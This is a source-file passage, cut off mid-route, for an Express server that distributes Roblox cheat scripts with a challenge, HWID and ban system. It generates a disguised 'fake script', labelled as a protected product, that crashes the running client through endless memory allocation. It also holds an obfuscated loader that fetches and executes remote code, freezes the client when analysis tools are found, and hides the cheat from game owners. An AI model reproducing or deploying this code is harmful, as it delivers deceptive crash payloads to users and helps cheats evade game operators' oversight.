const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const config = require('./config');
const db = require('./lib/redis');

const app = express();
const SESSIONS = new Map();

// --- CONFIGURATION ---
const ALLOWED_EXECUTORS = ['delta', 'fluxus', 'krnl', 'oxygen', 'evon', 'hydrogen', 'vegax', 'trigon', 'comet', 'solara', 'wave', 'zorara', 'codex', 'celery', 'swift', 'sirhurt', 'electron', 'sentinel', 'coco', 'temple', 'valyse', 'nihon', 'jjsploit', 'wearedevs'];
const BLOCKED_EXECUTORS = ['synapse', 'arceus', 'script-ware', 'scriptware']; 
// Daftar User Agent Bot diperluas
const BOT_UA = ['python', 'curl', 'wget', 'axios', 'node-fetch', 'aiohttp', 'httpx', 'requests', 'postman', 'insomnia', 'discord', 'telegram', 'scrapy', 'selenium', 'puppeteer', 'java', 'okhttp', 'perl', 'php', 'ruby', 'go-http', 'got', 'undici', 'urllib', 'apache', 'libwww', 'bot', 'crawler', 'spider', 'fiddler', 'charles', 'mitmproxy', 'burp', 'googlebot', 'bingbot', 'yandex'];

// --- HTML TEMPLATES (ADMIN & TRAP) ---
const ADMIN_HTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Panel</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);min-height:100vh;color:#fff;padding:20px}.container{max-width:1200px;margin:0 auto}.header{text-align:center;margin-bottom:30px}.header h1{font-size:2.5rem;background:linear-gradient(90deg,#00d4ff,#7b2cbf);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px}.header p{color:#888}.login-box{background:rgba(255,255,255,0.05);border-radius:15px;padding:30px;max-width:400px;margin:50px auto;border:1px solid rgba(255,255,255,0.1)}.login-box h2{margin-bottom:20px;text-align:center}.input-group{margin-bottom:15px}.input-group label{display:block;margin-bottom:5px;color:#aaa;font-size:14px}.input-group input{width:100%;padding:12px 15px;border:1px solid rgba(255,255,255,0.2);border-radius:8px;background:rgba(0,0,0,0.3);color:#fff;font-size:14px}.input-group input:focus{outline:none;border-color:#00d4ff}.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}.btn-primary{background:linear-gradient(90deg,#00d4ff,#7b2cbf);color:#fff}.btn-primary:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(0,212,255,0.4)}.btn-danger{background:#ff4757;color:#fff}.btn-danger:hover{background:#ff3344}.btn-success{background:#2ed573;color:#fff}.btn-secondary{background:#57606f;color:#fff}.dashboard{display:none}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:25px;text-align:center;border:1px solid rgba(255,255,255,0.1)}.stat-card h3{font-size:2.5rem;margin-bottom:5px}.stat-card.blue h3{color:#00d4ff}.stat-card.green h3{color:#2ed573}.stat-card.orange h3{color:#ffa502}.stat-card.red h3{color:#ff4757}.stat-card p{color:#888;font-size:14px}.section{background:rgba(255,255,255,0.05);border-radius:12px;padding:25px;margin-bottom:20px;border:1px solid rgba(255,255,255,0.1)}.section h2{margin-bottom:20px;display:flex;align-items:center;gap:10px}.section h2 span{font-size:1.5rem}.table-container{overflow-x:auto}.table{width:100%;border-collapse:collapse}.table th,.table td{padding:12px 15px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1)}.table th{background:rgba(0,0,0,0.3);font-weight:600;color:#aaa;font-size:12px;text-transform:uppercase}.table td{font-size:14px}.table tr:hover{background:rgba(255,255,255,0.05)}.badge{padding:4px 10px;border-radius:20px;font-size:12px;font-weight:600}.badge-success{background:rgba(46,213,115,0.2);color:#2ed573}.badge-danger{background:rgba(255,71,87,0.2);color:#ff4757}.badge-warning{background:rgba(255,165,2,0.2);color:#ffa502}.actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}.action-btn{padding:10px 20px;border:none;border-radius:8px;font-size:14px;cursor:pointer;display:flex;align-items:center;gap:8px;transition:all 0.3s}.action-btn:hover{transform:translateY(-2px)}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center;z-index:1000}.modal-content{background:#1a1a2e;border-radius:15px;padding:30px;max-width:500px;width:90%;border:1px solid rgba(255,255,255,0.1)}.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.modal-header h3{font-size:1.5rem}.close-btn{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}.toast{position:fixed;bottom:20px;right:20px;padding:15px 25px;border-radius:8px;color:#fff;font-weight:500;transform:translateX(400px);transition:transform 0.3s;z-index:1001}.toast.show{transform:translateX(0)}.toast-success{background:#2ed573}.toast-error{background:#ff4757}.toast-info{background:#00d4ff}</style></head><body><div class="container"><div class="header"><h1>🛡️ Script Admin Panel</h1><p>Manage your script protection system</p></div><div class="login-box" id="loginBox"><h2>🔐 Admin Login</h2><div class="input-group"><label>Admin Key</label><input type="password" id="adminKey" placeholder="Enter your admin key"></div><button class="btn btn-primary" onclick="login()">Login</button></div><div class="dashboard" id="dashboard"><div class="stats-grid"><div class="stat-card blue"><h3 id="statSessions">0</h3><p>Active Sessions</p></div><div class="stat-card green"><h3 id="statSuccess">0</h3><p>Successful Loads</p></div><div class="stat-card orange"><h3 id="statChallenges">0</h3><p>Challenges</p></div><div class="stat-card red"><h3 id="statBans">0</h3><p>Total Bans</p></div></div><div class="section"><h2><span>🚫</span> Ban Management</h2><div class="actions"><button class="action-btn btn-primary" onclick="openBanModal()">➕ Add Ban</button><button class="action-btn btn-danger" onclick="clearAllBans()">🗑️ Clear All Bans</button><button class="action-btn btn-secondary" onclick="refreshBans()">🔄 Refresh</button></div><div class="table-container"><table class="table"><thead><tr><th>Ban ID</th><th>HWID/IP/Player</th><th>Reason</th><th>Date</th><th>Actions</th></tr></thead><tbody id="bansTable"></tbody></table></div></div><div class="section"><h2><span>📋</span> Recent Logs</h2><div class="actions"><button class="action-btn btn-secondary" onclick="refreshLogs()">🔄 Refresh</button><select id="logLimit" onchange="refreshLogs()" style="padding:10px;border-radius:8px;background:#1a1a2e;color:#fff;border:1px solid rgba(255,255,255,0.2)"><option value="20">Last 20</option><option value="50">Last 50</option><option value="100">Last 100</option></select></div><div class="table-container"><table class="table"><thead><tr><th>Time</th><th>Action</th><th>Client</th><th>IP</th><th>Status</th></tr></thead><tbody id="logsTable"></tbody></table></div></div><div class="section"><h2><span>⚙️</span> Quick Actions</h2><div class="actions"><button class="action-btn btn-warning" onclick="clearCache()" style="background:#ffa502">🗑️ Clear Script Cache</button><button class="action-btn btn-secondary" onclick="clearSessions()">🔄 Clear Sessions</button><button class="action-btn btn-danger" onclick="logout()">🚪 Logout</button></div></div></div></div><div class="modal" id="banModal"><div class="modal-content"><div class="modal-header"><h3>➕ Add New Ban</h3><button class="close-btn" onclick="closeBanModal()">&times;</button></div><div class="input-group"><label>HWID (optional)</label><input type="text" id="banHwid" placeholder="Enter HWID"></div><div class="input-group"><label>Player ID (optional)</label><input type="text" id="banPlayerId" placeholder="Enter Player ID"></div><div class="input-group"><label>IP Address (optional)</label><input type="text" id="banIp" placeholder="Enter IP"></div><div class="input-group"><label>Reason</label><input type="text" id="banReason" placeholder="Enter reason" value="Manual ban"></div><button class="btn btn-danger" onclick="addBan()">🚫 Add Ban</button></div></div><div class="toast" id="toast"></div><script>let API_KEY='';const API_BASE=window.location.origin;function showToast(msg,type='info'){const t=document.getElementById('toast');t.textContent=msg;t.className='toast show toast-'+type;setTimeout(()=>t.classList.remove('show'),3000)}async function api(endpoint,method='GET',body=null){const opts={method,headers:{'Content-Type':'application/json','x-admin-key':API_KEY}};if(body)opts.body=JSON.stringify(body);const res=await fetch(API_BASE+endpoint,opts);return res.json()}async function login(){API_KEY=document.getElementById('adminKey').value;if(!API_KEY){showToast('Please enter admin key','error');return}try{const data=await api('/api/admin/stats');if(data.success){document.getElementById('loginBox').style.display='none';document.getElementById('dashboard').style.display='block';localStorage.setItem('adminKey',API_KEY);loadDashboard();showToast('Login successful!','success')}else{showToast('Invalid admin key','error')}}catch(e){showToast('Connection error','error')}}async function loadDashboard(){await refreshStats();await refreshBans();await refreshLogs()}async function refreshStats(){try{const data=await api('/api/admin/stats');if(data.success){document.getElementById('statSessions').textContent=data.sessions||0;document.getElementById('statSuccess').textContent=data.stats?.success||0;document.getElementById('statChallenges').textContent=data.stats?.challenges||0;document.getElementById('statBans').textContent=data.stats?.bans||0}}catch(e){}}async function refreshBans(){try{const data=await api('/api/admin/bans');const tbody=document.getElementById('bansTable');if(data.success&&data.bans&&data.bans.length>0){tbody.innerHTML=data.bans.map(b=>\`<tr><td><code>\${b.banId||'N/A'}</code></td><td>\${b.hwid||b.ip||b.playerId||'N/A'}</td><td>\${b.reason||'N/A'}</td><td>\${b.ts?new Date(b.ts).toLocaleString():'N/A'}</td><td><button class="btn-danger" style="padding:5px 10px;border:none;border-radius:5px;cursor:pointer" onclick="removeBan('\${b.banId}')">Remove</button></td></tr>\`).join('')}else{tbody.innerHTML='<tr><td colspan="5" style="text-align:center;color:#888">No bans found</td></tr>'}}catch(e){showToast('Failed to load bans','error')}}async function refreshLogs(){try{const limit=document.getElementById('logLimit').value;const data=await api('/api/admin/logs?limit='+limit);const tbody=document.getElementById('logsTable');if(data.success&&data.logs&&data.logs.length>0){tbody.innerHTML=data.logs.reverse().map(l=>\`<tr><td>\${l.ts?new Date(l.ts).toLocaleTimeString():'N/A'}</td><td>\${l.action||'N/A'}</td><td><span class="badge \${l.client==='executor'?'badge-success':l.client==='bot'?'badge-danger':'badge-warning'}">\${l.client||'unknown'}</span></td><td><code>\${(l.ip||'N/A').substring(0,15)}</code></td><td><span class="badge \${l.success?'badge-success':'badge-danger'}">\${l.success?'OK':'FAIL'}</span></td></tr>\`).join('')}else{tbody.innerHTML='<tr><td colspan="5" style="text-align:center;color:#888">No logs found</td></tr>'}}catch(e){showToast('Failed to load logs','error')}}function openBanModal(){document.getElementById('banModal').style.display='flex'}function closeBanModal(){document.getElementById('banModal').style.display='none'}async function addBan(){const hwid=document.getElementById('banHwid').value;const playerId=document.getElementById('banPlayerId').value;const ip=document.getElementById('banIp').value;const reason=document.getElementById('banReason').value;if(!hwid&&!playerId&&!ip){showToast('Enter at least one identifier','error');return}try{const data=await api('/api/admin/bans','POST',{hwid,playerId:playerId?parseInt(playerId):null,ip,reason});if(data.success){showToast('Ban added: '+data.banId,'success');closeBanModal();refreshBans();refreshStats()}else{showToast(data.error||'Failed','error')}}catch(e){showToast('Error adding ban','error')}}async function removeBan(banId){if(!confirm('Remove this ban?'))return;try{const data=await api('/api/admin/bans/'+banId,'DELETE');if(data.success){showToast('Ban removed','success');refreshBans();refreshStats()}else{showToast(data.error||'Failed','error')}}catch(e){showToast('Error removing ban','error')}}async function clearAllBans(){if(!confirm('Clear ALL bans? This cannot be undone!'))return;try{const data=await api('/api/admin/bans/clear','POST');if(data.success){showToast('Cleared '+data.cleared+' bans','success');refreshBans();refreshStats()}else{showToast(data.error||'Failed','error')}}catch(e){showToast('Error clearing bans','error')}}async function clearCache(){try{const data=await api('/api/admin/cache/clear','POST');if(data.success){showToast('Cache cleared','success')}else{showToast(data.error||'Failed','error')}}catch(e){showToast('Error clearing cache','error')}}async function clearSessions(){try{const data=await api('/api/admin/sessions/clear','POST');if(data.success){showToast('Sessions cleared: '+data.cleared,'success');refreshStats()}else{showToast(data.error||'Failed','error')}}catch(e){showToast('Error clearing sessions','error')}}function logout(){localStorage.removeItem('adminKey');API_KEY='';document.getElementById('loginBox').style.display='block';document.getElementById('dashboard').style.display='none';document.getElementById('adminKey').value=''}window.onload=function(){const saved=localStorage.getItem('adminKey');if(saved){document.getElementById('adminKey').value=saved;login()}}</script></body></html>`;
const TRAP_HTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Access Denied</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0a0a 0%,#1a1a2e 50%,#16213e 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#fff}.container{text-align:center;padding:40px}.shield{font-size:80px;margin-bottom:30px;animation:pulse 2s infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}.title{font-size:28px;font-weight:700;margin-bottom:15px;color:#ff4757}.subtitle{color:#888;margin-bottom:30px}.code{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:15px 25px;font-family:monospace;color:#ff6b6b}</style></head><body><div class="container"><div class="shield">🛡️</div><div class="title">Access Denied</div><div class="subtitle">Browser and bot access is not permitted.</div><div class="code">HTTP 403 | Forbidden</div></div></body></html>`;

// --- UTILITIES ---
function sha256(s) { return crypto.createHash('sha256').update(s).digest('hex'); }
function hmac(d, k) { return crypto.createHmac('sha256', k).update(d).digest('hex'); }
function secureCompare(a, b) { if (typeof a !== 'string' || typeof b !== 'string' || a.length !== b.length) return false; try { return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b)); } catch { return false; } }
function getIP(r) { return (r.headers['x-forwarded-for'] || '').split(',')[0].trim() || r.headers['x-real-ip'] || r.ip || '0.0.0.0'; }
function getHWID(r) { return r.headers['x-hwid'] || null; }
function genSessionKey(u, h, t, s) { return hmac(`${u}:${h}:${t}`, s).substring(0, 32); }

// --- NEW "HEAVY" FAKE SCRIPT GENERATOR ---
// Membuat kode palsu yang terlihat sangat rumit, berantakan, dan mengintimidasi.
function genFakeScript() {
    const randChar = () => 'Ili1'[Math.floor(Math.random()*4)];
    const randVar = (len=8) => '_' + Array.from({length:len}, randChar).join('');
    const randByte = () => Math.floor(Math.random() * 255);
    
    // Generate Variable Names yang membingungkan (Il1l1l style)
    const vTable = randVar(10);
    const vBytecode = randVar(12);
    const vDec = randVar(6);
    const vEnv = randVar(8);
    const vLoop = randVar(6);
    const vCrash = randVar(8);
    
    // Generate Junk Data (Fake Bytecode) yang besar
    const junkData = Array.from({length: 150}, randByte).join(',');
    
    return `
--[[ Protected by Luarmor v3.2 (Enterprise) ]]
local ${vTable} = {${junkData}}
local ${vBytecode} = ""
local ${vEnv} = getfenv()

-- Fake VM Header
local function ${vDec}(s, k)
    local r = {}
    for i=1, #s do
        table.insert(r, string.char(bit32.bxor(string.byte(s, i), k % 255)))
    end
    return table.concat(r)
end

-- Obfuscated Loop
local ${vLoop} = function()
    local x = 0
    for i=1, 10000 do
        x = x + (i * 2)
    end
    return x
end

-- THE TRAP: Infinite Crash Loop hidden in pcall
pcall(function()
    if not ${vEnv}["game"] then return end
    
    -- Fake Loading
    ${vEnv}["game"]:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Security Check",
        Text = "Verifying Integrity...",
        Duration = 5
    })
    
    task.wait(2)
    
    -- MEMORY CRASH LOGIC
    local crash = {}
    while true do
        -- Infinite allocation
        table.insert(crash, string.rep("CRASH", 10000))
        -- Busy loop
        for i=1,1000 do
             local _ = math.sqrt(i) * math.tan(i)
        end
    end
end)

-- Junk return
return ${vDec}("FakePayload", 123)
`;
}

// --- REAL LOADER GENERATOR (CLEAN & POLYMORPHIC) ---
function getLoader(serverUrl) {
    const randName = () => '_' + Math.random().toString(36).substring(2, 8);
    const key = Math.floor(Math.random() * 200) + 10;
    const urlEncrypted = [];
    for (let i = 0; i < serverUrl.length; i++) {
        urlEncrypted.push(serverUrl.charCodeAt(i) ^ key);
    }

    const vKey = randName(), vBytes = randName(), vUrl = randName();
    const vHttp = randName(), vPlayers = randName(), vGui = randName(), vLocal = randName();
    const vNotify = randName(), vHw = randName(), vReq = randName();
    const vXor = randName(), vSolve = randName(), vMain = randName();

    return `
--[[ Protected Loader ]]
local ${vKey} = ${key}
local ${vBytes} = {${urlEncrypted.join(',')}}
local ${vUrl} = ""
for _, b in ipairs(${vBytes}) do 
    ${vUrl} = ${vUrl} .. string.char(bit32.bxor(b, ${vKey}) % 255) 
end

local ${vHttp} = game:GetService("HttpService")
local ${vPlayers} = game:GetService("Players")
local ${vGui} = game:GetService("StarterGui")
local ${vLocal} = ${vPlayers}.LocalPlayer

local function _integrity()
    local r = (syn and syn.request) or request or http_request or (http and http.request)
    if not r then return end
    if iscclosure and not iscclosure(r) then while true do end end
    if iscclosure and not iscclosure(game.HttpGet) then while true do end end
end
pcall(_integrity)

local function ${vNotify}(t,x,d) pcall(function() ${vGui}:SetCore("SendNotification",{Title=t,Text=x,Duration=d or 3}) end) end
local function ${vHw}() local s,r=pcall(function() if gethwid then return gethwid() end return "FB_"..tostring(${vLocal}.UserId) end) return s and r or "UNK" end

local function ${vReq}(u,d) 
    local r=(syn and syn.request) or request or http_request or (http and http.request) 
    if not r then ${vNotify}("❌","No HTTP",5) return nil end 
    local s,res=pcall(function() 
        return r({Url=u,Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Roblox/WinInet",["x-hwid"]=${vHw}(),["x-roblox-id"]=tostring(${vLocal}.UserId),["x-place-id"]=tostring(game.PlaceId),["x-job-id"]=game.JobId},Body=${vHttp}:JSONEncode(d)}) 
    end) 
    if not s then ${vNotify}("❌","Failed",5) return nil end 
    if res.StatusCode~=200 then return nil end 
    local ps,pd=pcall(function() return ${vHttp}:JSONDecode(res.Body) end) 
    return ps and pd or nil 
end

local function ${vXor}(d,k) local r={} for i=1,#d do r[i]=string.char(bit32.bxor(d[i],string.byte(k,((i-1)%#k)+1))) end return table.concat(r) end
local function ${vSolve}(p) if p.type=="math" then local a,b,c,op=p.puzzle.a,p.puzzle.b,p.puzzle.c,p.puzzle.op if op=="+" then return(a+b)*c elseif op=="-" then return(a-b)*c elseif op=="*" then return(a*b)+c end elseif p.type=="bitwise" then local x,y,op=p.puzzle.x,p.puzzle.y,p.puzzle.op if op=="xor" then return bit32.bxor(x,y) elseif op=="and" then return bit32.band(x,y) elseif op=="or" then return bit32.bor(x,y) end elseif p.type=="sequence" then local s=p.puzzle.seq return s[4]+(s[2]-s[1]) elseif p.numbers then local sum=0 for _,x in ipairs(p.numbers) do sum=sum+x end return sum end return 0 end

local function ${vMain}() 
    ${vNotify}("🔄","Loading...",2) 
    local c=${vReq}(${vUrl}.."/api/auth/challenge",{userId=${vLocal}.UserId,hwid=${vHw}(),placeId=game.PlaceId}) 
    if not c or not c.success then ${vNotify}("❌","Err",5) return end 
    local v=${vReq}(${vUrl}.."/api/auth/verify",{challengeId=c.challengeId,solution=${vSolve}(c),timestamp=os.time()}) 
    if not v or not v.success then ${vNotify}("❌","Err",5) return end 
    ${vNotify}("✅","OK",2) 
    local fs 
    if v.mode=="raw" then fs=v.script else local p={} for i,ch in ipairs(v.chunks) do p[i]=${vXor}(ch,v.key) end fs=table.concat(p) end 
    local fn=loadstring(fs) 
    if fn then pcall(fn) end 
end
pcall(${vMain})`;
}

// --- UTILS ---
function getClientType(r) {
    const ua = (r.headers['user-agent'] || '').toLowerCase();
    const hasHWID = !!r.headers['x-hwid'];
    const hasExecutorHeaders = hasHWID || !!r.headers['x-roblox-id'] || !!r.headers['x-job-id'];
    
    // Check Bots FIRST
    if (!ua || ua.length < 5 || ua === 'mozilla/5.0') return 'bot';
    if (BOT_UA.some(p => ua.includes(p))) return 'bot';
    
    // Then Blocked
    if (BLOCKED_EXECUTORS.some(e => ua.includes(e))) return 'blocked_executor';
    
    // Then Real Executors
    if (hasExecutorHeaders) return 'executor';
    if (ALLOWED_EXECUTORS.some(e => ua.includes(e))) return 'executor';
    if (ua.includes('roblox') || ua.includes('wininet')) return 'executor';
    
    // Then Browsers
    if (r.headers['sec-fetch-dest'] || r.headers['sec-fetch-mode'] || r.headers['upgrade-insecure-requests']) return 'browser';
    const accept = r.headers['accept'] || '';
    if (accept.includes('text/html') && r.headers['accept-language']) return 'browser';
    
    if (!hasExecutorHeaders) return 'unknown';
    return 'executor';
}

async function logAccess(r, a, s, d = {}) {
    const log = { ip: getIP(r), hwid: getHWID(r), ua: (r.headers['user-agent'] || '').substring(0, 100), action: a, success: s, path: r.path, client: getClientType(r), ts: new Date().toISOString(), ...d };
    await db.addLog(log);
    return log;
}

function genChallenge() {
    const types = ['math', 'bitwise', 'sequence', 'sum'];
    const type = types[Math.floor(Math.random() * types.length)];
    switch (type) {
        case 'math': const op = ['+', '-', '*'][Math.floor(Math.random() * 3)]; const a = Math.floor(Math.random() * 50) + 10, b = Math.floor(Math.random() * 20) + 5, c = Math.floor(Math.random() * 10) + 1; let ans; if (op === '+') ans = (a + b) * c; else if (op === '-') ans = (a - b) * c; else ans = (a * b) + c; return { type: 'math', puzzle: { a, b, c, op }, answer: ans };
        case 'bitwise': const x = Math.floor(Math.random() * 200) + 50, y = Math.floor(Math.random() * 100) + 20; const bop = ['xor', 'and', 'or'][Math.floor(Math.random() * 3)]; let bans; if (bop === 'xor') bans = x ^ y; else if (bop === 'and') bans = x & y; else bans = x | y; return { type: 'bitwise', puzzle: { x, y, op: bop }, answer: bans };
        case 'sequence': const start = Math.floor(Math.random() * 15) + 1, step = Math.floor(Math.random() * 8) + 2; return { type: 'sequence', puzzle: { seq: [start, start + step, start + step * 2, start + step * 3] }, answer: start + step * 4 };
        default: const nums = Array.from({ length: 5 }, () => Math.floor(Math.random() * 50) + 1); return { type: 'sum', puzzle: { numbers: nums }, answer: nums.reduce((a, b) => a + b, 0) };
    }
}

function isObfuscated(s) { return s && [/Luraph/i, /Moonsec/i, /IronBrew/i, /Prometheus/i, /PSU/i].some(r => r.test(s.substring(0, 500))); }

async function getScript() {
    const cached = await db.getCachedScript(); if (cached) return cached; if (!config.SCRIPT_SOURCE_URL) return null;
    try { const res = await axios.get(config.SCRIPT_SOURCE_URL, { timeout: 30000, headers: { 'User-Agent': 'Roblox/WinInet' }, maxContentLength: 50000000 }); if (typeof res.data === 'string' && res.data.length > 50) { await db.setCachedScript(res.data); return res.data; } } catch (e) { } return null;
}

function wrapScript(script, serverUrl) {
    const o = config.OWNER_USER_IDS.join(','), w = config.WHITELIST_USER_IDS.join(','), b = `${serverUrl}/api/ban`, hb = `${serverUrl}/api/heartbeat`;
    return `local _O={${o}} local _W={${w}} local _B="${b}" local _HB="${hb}" local _P=game:GetService("Players") local _L=_P.LocalPlayer local _S=game:GetService("StarterGui") local _C=game:GetService("CoreGui") local _H=game:GetService("HttpService") local _TS=game:GetService("TeleportService") local _A=true local _SD=false local _CON={} local _THR={} local _RDY=false local _SID="${crypto.randomBytes(16).toString('hex')}" local _HB_FAIL=0
local _IT={g={},m={}}
local _PG=nil
pcall(function() _PG=_L:FindFirstChild("PlayerGui") or _L:WaitForChild("PlayerGui",3) end)
local function _isW(u) if not _W or #_W==0 then return false end for _,i in ipairs(_W) do if u==i then return true end end return false end
local function _isO(u) if not _O or #_O==0 then return false end for _,i in ipairs(_O) do if u==i then return true end end return false end
local function _n(t,x,d) pcall(function() _S:SetCore("SendNotification",{Title=t,Text=x,Duration=d or 3}) end) end
local function _hw() local s,r=pcall(function() if gethwid then return gethwid() end return "FB_"..tostring(_L.UserId) end) return s and r or "UNK" end
local function _hp(u,d,m) local r=(syn and syn.request) or request or http_request or (http and http.request) if not r then return nil end m=m or"POST" local ok,res=pcall(function() return r({Url=u,Method=m,Headers={["Content-Type"]="application/json",["User-Agent"]="Roblox/WinInet",["x-hwid"]=_hw(),["x-roblox-id"]=tostring(_L.UserId),["x-place-id"]=tostring(game.PlaceId),["x-job-id"]=game.JobId,["x-session-id"]=_SID},Body=d and _H:JSONEncode(d) or nil}) end) if not ok or not res then return nil end if res.StatusCode~=200 then return nil end local ps,pd=pcall(function() return _H:JSONDecode(res.Body) end) return ps and pd or nil end
local function _cl() if _SD then return end _SD=true _A=false _RDY=false for i=#_THR,1,-1 do pcall(task.cancel,_THR[i]) end for i=#_CON,1,-1 do pcall(function() _CON[i]:Disconnect() end) end end
_G._SCRIPT_CLEANUP=_cl
local _TP={"simplespy","httpspy","remotespy","hydroxide","infiniteyield","serverspy","scriptdumper","darkdex","dex_explorer"}
local _TM={"SimpleSpy","HttpSpy","RemoteSpy","Hydroxide","Dex","DexExplorer","InfiniteYield","IY_LOADED"}
local function _doSnap() local e=getgenv and getgenv() or _G for _,m in ipairs(_TM) do if rawget(e,m) then _IT.m[m]=true end end if _C then pcall(function() for _,g in pairs(_C:GetChildren()) do if g:IsA("ScreenGui") then _IT.g[g.Name:lower()]=true end end end) end if _PG then pcall(function() for _,g in pairs(_PG:GetChildren()) do if g:IsA("ScreenGui") then _IT.g[g.Name:lower()]=true end end end) end end
local function _snap() if _isW(_L.UserId) then _RDY=true return end _doSnap() task.wait(1) _doSnap() task.wait(1) _doSnap() _RDY=true end
local function _det() if not _RDY or not _A or _isW(_L.UserId) then return false end local e=getgenv and getgenv() or _G for _,m in ipairs(_TM) do local ok,v=pcall(function() return rawget(e,m) end) if ok and v and not _IT.m[m] then return true,"ENV",m end end return false end
local function _mon() if _isW(_L.UserId) then return end table.insert(_THR,task.spawn(function() while not _RDY do task.wait(0.5) end task.wait(5) while _A and not _SD do task.wait(30) if not _A or _SD then break end local d,c,s=_det() if d then _hp(_B,{hwid=_hw(),playerId=_L.UserId,playerName=_L.Name,reason="Tool: "..(s or c),toolsDetected={c,s},sessionId=_SID}) _cl() while true do end break end end end)) end
local function _heartbeat() if _isW(_L.UserId) then return end table.insert(_THR,task.spawn(function() task.wait(15) while _A and not _SD do task.wait(60) if not _A or _SD then break end local res=_hp(_HB,{sessionId=_SID,hwid=_hw()}) if res then _HB_FAIL=0 if res.action=="TERMINATE" then _cl() break end else _HB_FAIL=_HB_FAIL+1 if _HB_FAIL>=5 then _cl() break end end end end)) end
local function _ownerOk() if not _O or #_O==0 then return true end for _,p in pairs(_P:GetPlayers()) do if _isO(p.UserId) and p~=_L then return false end end return true end
local function _ownerMon() if not _O or #_O==0 then return end table.insert(_THR,task.spawn(function() while _A and not _SD do task.wait(30) if not _ownerOk() then _n("⚠️","Owner detected",3) _cl() return end end end)) table.insert(_CON,_P.PlayerAdded:Connect(function(p) task.wait(2) if _isO(p.UserId) then _n("⚠️","Owner joined",3) _cl() end end)) end
if not _ownerOk() then _n("⚠️","Owner in server",3) return end
task.spawn(function() _snap() _mon() _ownerMon() _heartbeat() end)
${script}`;
}

// --- EXPRESS APP ---
app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false, crossOriginResourcePolicy: false }));
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'DELETE', 'OPTIONS'], allowedHeaders: ['Content-Type', 'x-admin-key', 'x-hwid', 'x-roblox-id', 'x-place-id', 'x-job-id', 'x-session-id'] }));
app.use(express.json({ limit: '10mb' }));
app.set('trust proxy', 1);
app.use(rateLimit({ windowMs: 60000, max: 100, keyGenerator: r => getIP(r) }));

app.use(async (req, res, next) => {
    const ban = await db.isBanned(null, getIP(req), null);
    if (ban.blocked) {
        const ct = getClientType(req);
        if (ct === 'browser') return res.status(403).type('html').send(TRAP_HTML);
        return res.status(403).type('text/plain').send(genFakeScript());
    }
    next();
});

app.get('/admin', (r, res) => { res.type('html').send(ADMIN_HTML) });

app.get('/', (r, res) => {
    const ct = getClientType(r);
    if (ct === 'browser') return res.status(403).type('html').send(TRAP_HTML);
    // BOTS GET THE HEAVY FAKE SCRIPT
    if (ct === 'bot' || ct === 'unknown') return res.status(403).type('text/plain').send(genFakeScript());
    if (ct === 'blocked_executor') return res.status(403).json({ error: 'Executor not allowed' });
    res.json({ status: 'ok', version: '7.1.0' });
});

app.get('/health', (r, res) => res.json({ status: 'ok' }));

app.get(['/loader', '/api/loader.lua', '/api/loader', '/l'], async (r, res) => {
    const ct = getClientType(r);
    await logAccess(r, 'LOADER_' + ct.toUpperCase(), ct === 'executor');
    
    if (ct === 'browser') return res.status(403).type('html').send(TRAP_HTML);
    
    // BOTS & BLOCKED EXECUTORS GET THE HEAVY FAKE SCRIPT
    if (ct === 'bot' || ct === 'unknown') return res.status(403).type('text/plain').send(genFakeScript());
    if (ct === 'blocked_executor') return res.status(403).type('text/plain').send(genFakeScript());
    
    // REAL EXECUTORS GET THE REAL LOADER
    const url = process.env.RENDER_EXTERNAL_URL || `${r.protocol}://${r.get('host')}`;
    res.type('text/plain').send(getLoader(url));
});

app.post('/api/auth/challenge', async (r, res) => {
    const ct = getClientType(r);
    await logAccess(r, 'CHALLENGE_' + ct.toUpperCase(), ct === 'executor');
    if (ct === 'browser') return res.status(403).type('html').send(TRAP_HTML);
    if (ct === 'bot' || ct === 'unknown') return res.status(403).type('text/plain').send(genFakeScript());
    if (ct === 'blocked_executor') return res.status(403).json({ success: false, error: 'Executor not allowed' });
    const { userId, hwid, placeId } = r.body;
    if (!userId || !hwid || !placeId) return res.status(400).json({ success: false, error: 'Missing fields' });
    const uid = parseInt(userId), pid = parseInt(placeId);
    if (isNaN(uid) || isNaN(pid)) return res.status(400).json({ success: false, error: 'Invalid format' });
    const ip = getIP(r);
    const ban = await db.isBanned(hwid, ip, uid);
    if (ban.blocked) return res.status(403).json({ success: false, error: 'Banned: ' + ban.reason });
    if (config.ALLOWED_PLACE_IDS && config.ALLOWED_PLACE_IDS.length > 0 && !config.ALLOWED_PLACE_IDS.includes(pid)) return res.status(403).json({ success: false, error: 'Game not allowed' });
    const id = crypto.randomBytes(16).toString('hex');
    const chal = genChallenge();
